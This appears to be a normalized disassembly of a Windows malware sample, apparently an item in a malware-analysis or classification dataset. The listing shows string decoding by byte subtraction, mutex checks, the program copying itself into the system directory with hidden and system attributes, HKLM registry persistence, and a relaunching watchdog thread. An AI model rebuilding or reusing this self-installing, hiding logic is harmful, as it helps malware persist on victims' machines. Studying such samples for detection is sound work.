sub_401000
push ecx
push ebx
push esi
push edi
push rw-data
call sub_4010bb
mov [ esp ] rw-data
call sub_4010bb
mov esi rw-data
push esi
call sub_4010bb
mov ebx rw-data
push ebx
call sub_4010bb
push rw-data
call sub_4010bb
push rw-data
call sub_4010bb
push rw-data
call sub_4010bb
push rw-data
call sub_4010bb
push rw-data
call sub_4010bb
push rw-data
call sub_4010bb
add esp 0x24
mov edi [ CreateEventA@IAT ]
push esi
xor esi esi
push esi
push esi
push esi
call edi
push ebx
push esi
push esi
push esi
mov [ rw-data ] eax
call edi
push esi
mov [ rw-data ] eax
call sub_401415
pop ecx
call sub_4011d0
lea eax [ esp + 0xc ]
push eax
push esi
push esi
push r-xdata
push esi
push esi
call [ CreateThread@IAT ]
call sub_4010ce
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x10
sub_4010ce
push esi
mov esi 0x708
push eax
call [ CloseHandle@IAT ]
pop esi
retn
push 0x3e8
call [ Sleep@IAT ]
dec esi
test esi esi
jg r-xdata
push rw-data
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
jne r-xdata
call sub_40110a
pop esi
retn
sub_40110a
push ebp
mov ebp esp
sub esp 0x400
push esi
push edi
push rw-data
mov [ rw-data ] 0x55
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
mov edi eax
lea eax [ ebp - 0x400 ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call strcat
pop ecx
xor eax eax
pop ecx
push eax
lea ecx [ ebp - 0x400 ]
push eax
push ecx
push rw-data
push eax
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x400 ]
push eax
call sub_401192
pop ecx
push esi
call [ FreeLibrary@IAT ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_401192
push ebp
mov ebp esp
sub esp 0x54
push esi
xor esi esi
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] si
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ CreateProcessA@IAT ]
pop esi
leave
retn
sub_4011d0
push ebp
mov ebp esp
sub esp 0x710
push ebx
push esi
push edi
mov edi rw-data
xor ebx ebx
push edi
push ebx
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax ebx
mov esi rw-data
je r-xdata
push edi
push ebx
push ebx
call [ CreateMutexA@IAT ]
lea eax [ ebp - 0x210 ]
push 0x200
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x210 ]
push esi
push eax
call strcat
mov esi [ SetFileAttributesA@IAT ]
add esp 0x10
lea eax [ ebp - 0x210 ]
push ebx
push eax
call esi
mov edi [ DeleteFileA@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call edi
lea eax [ ebp - 0x710 ]
push 0x400
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov [ ebp + eax - 0x710 ] bl
lea eax [ ebp - 0x210 ]
push 0x200
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x210 ]
push 0x2e
push eax
call [ strrchr@IAT ]
mov [ eax ] bl
lea eax [ ebp - 0x710 ]
push 0x2e
push eax
call [ strrchr@IAT ]
add esp 0x20
mov [ eax ] bl
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x710 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
push ebx
push esi
call sub_40150e
pop ecx
pop ecx
push 0x1
push rw-data
call sub_40150e
push 0x1
call sub_401415
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x710 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x210 ]
pop ecx
push ebx
push eax
call esi
movsx eax [ ebp - 0x710 ]
push eax
lea eax [ ebp - 0x10 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x10 ]
push ebx
push eax
lea eax [ ebp - 0x710 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x210 ]
push ebx
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call edi
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x310 ]
push eax
call strcpy
lea eax [ ebp - 0x310 ]
push rw-data
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x310 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x310 ]
push eax
call edi
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ rename@IAT ]
pop ecx
lea eax [ ebp - 0x210 ]
pop ecx
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ ebp - 0x210 ]
push eax
call esi
lea eax [ ebp - 0x210 ]
push eax
call sub_401192
pop ecx
push 0x1
call [ ExitProcess@IAT ]
sub_401415
push ebp
mov ebp esp
sub esp 0x288
push ebx
xor ebx ebx
push esi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] 0x80
xor esi esi
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
jne r-xdata
push edi
lea eax [ ebp - 0x288 ]
push 0x200
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x288 ]
push 0x5c
push eax
call [ strrchr@IAT ]
mov esi eax
inc esi
push esi
push rw-data
call strcpy
mov dl [ esi ]
add esp 0x10
xor edi edi
cmp dl bl
je r-xdata
mov al [ ebp - 0x88 ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] bl
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
pop edi
lea ecx [ ebp - 0x88 ]
mov eax esi
sub ecx esi
cmp [ ebp + 0x8 ] ebx
mov [ esi + rw-data ] bl
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ ebp + esi - 0x87 ]
inc esi
jmp r-xdata
inc dl
inc edi
mov [ ecx + eax ] dl
mov dl [ eax + 0x1 ]
inc eax
cmp dl bl
jne r-xdata
pop esi
pop ebx
leave
retn
cmp al bl
je r-xdata
sub_40150e
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
call [ RegCreateKeyExA@IAT ]
cmp [ ebp + 0xc ] 0x1
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
call strlen
pop ecx
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
jmp r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40173d
cmp [ rw-data ] ebx
jne r-xdata
call sub_401728
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40173a
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4010bb
mov eax [ esp + 0x4 ]
retn
sub cl 0x5
mov [ eax ] cl
inc eax
jmp r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
strcat
jmp [ strcat@IAT ]
memset
jmp [ memset@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401728
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40173a
xor eax eax
retn
sub_40173d
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
